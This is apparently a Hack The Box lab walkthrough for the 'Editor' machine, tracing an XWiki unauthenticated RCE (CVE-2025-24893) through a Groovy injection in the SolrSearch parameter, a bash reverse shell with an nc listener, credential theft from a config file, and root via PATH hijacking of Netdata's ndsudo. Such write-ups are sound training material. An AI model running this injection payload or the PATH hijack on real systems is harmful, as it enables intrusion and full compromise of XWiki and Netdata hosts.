# Hack The Box: Editor - Comprehensive Notes

Target IP: 10.129.232.178

**Hostname:** `editor.htb`

## 1. Scanning & Enumeration

### Network Scanning (Nmap)

**Open Ports:**

- `22/tcp` - SSH (OpenSSH 8.9p1 Ubuntu)
    
- `80/tcp` - HTTP (Nginx 1.18.0)
    
- `8080/tcp` - HTTP (Jetty 10.0.20 / XWiki)
    

**Scan Results:**

```
nmap -p 22,80,8080 -sCV editor.htb
# 80/tcp: "Editor - SimplistCode Pro"
# 8080/tcp: "XWiki - Main - Intro"
# Potential Risks: Methods PROPFIND, LOCK, UNLOCK allowed on 8080.
```

### Web Enumeration

**Port 80 (SimplistCode Pro Editor):**

- Static marketing site.
    
- Feroxbuster directory scanning revealed assets:
    
    - `http://editor.htb/assets/index-VRKEJlit.js`
        
    - Source code analysis of this JS file leaked a subdomain: **`wiki.editor.htb`**
        

**Port 8080 (XWiki):**

- **Application:** XWiki (Java-based Wiki) on Jetty.
    
- **Enumeration:**
    
    - Robots.txt reveals standard XWiki paths (`/xwiki/bin/...`).
        
    - User Enumeration: Valid user **`neal`** found via `http://editor.htb:8080/xwiki/bin/view/XWiki/neal`.
        
    - **Vulnerability Identified:** The notes reference **CVE-2025-24893** (Unauthenticated RCE in XWiki).
        

## 2. Exploitation (User Access)

### Exploit Strategy (XWiki RCE)

The target is vulnerable to an unauthenticated Remote Code Execution vulnerability in the XWiki instance.

- **Exploit Script:** `CVE-2025-24893-dbs.py`
    
- **Target:** `http://10.129.232.178:8080`
    
- **Injection Point:** SolrSearch parameter using a Groovy payload.
    

Payload:

The exploit injects a Groovy script into the search query that executes a bash reverse shell:

```
[http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=](http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=)...{{groovy}}"bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}"...
```

**Execution:**

1. Set up listener: `nc -lvnp 8080` (or the port specified in your payload).
    
2. Run the python exploit script.
    
3. **Result:** Unstable shell gained as the service user (likely `jetty` or `tomcat`).
    
4. **Stabilization:** `python3 -c "__import__('pty').spawn('/bin/bash')"`
    

## 3. Lateral Movement

### Credential Harvesting

Inside the shell, we enumerated the file system for credentials.

- **File Found:** `/usr/lib/xwiki-jetty/webapps/resources/WEB-INF/hibernate.cfg.xml`
    
- **Content:** Found database connection credentials.
    
- **Decryption:** The password in the XML file was Base64 encoded.
    
    - `cat hibernate.txt | base64 -d`
        

**Credentials Retrieved:**

- **User:** `oliver` (Confirmed by checking `/home` and `/etc/passwd`)
    
- **Password:** `theEd1t0rTeam99`
    

### SSH Access

Used the discovered credentials to log in via SSH:

```
ssh oliver@editor.htb
# Password: theEd1t0rTeam99
```

## 4. Privilege Escalation (Root)

### Internal Enumeration

- **Kernel:** `5.15.0-151-generic`
    
- **SUID/Capabilities:** The system appears to use `Netdata` and a custom sudo wrapper `ndsudo`.
    

### Exploit Path: Path Hijacking via `ndsudo`

While the notes referenced a kernel exploit (CVE-2024-32019), the successful exploitation method appears to be **Path Hijacking** involving the `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo` binary.

Vulnerability:

The ndsudo binary executes a command (likely nvme-list or nvme) without specifying the absolute path, or it allows the environment to persist. By exporting a custom PATH, we can force it to run our malicious binary instead of the system one.

**Exploit Steps:**

1. **Create Payload:** Create a malicious executable named `nvme` (or `nvme-list`) that spawns a shell.
    
    - _Note: Notes mention compiling `poc.c` to `nvme`._
        
2. **Transfer:** SCP the binary to `/tmp/nvme` on the target.
    
3. **Setup Environment:**
    
    ```
    chmod +x /tmp/nvme
    export PATH=/tmp:$PATH
    ```
    
4. Execution:
    
    Run the vulnerable binary:
    
    ```
    /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
    ```
    
    _Because `/tmp` is now first in the PATH, `ndsudo` executes our malicious `/tmp/nvme` with root privileges._
    

**Result:** Root shell obtained.

**Status:** Machine Completed.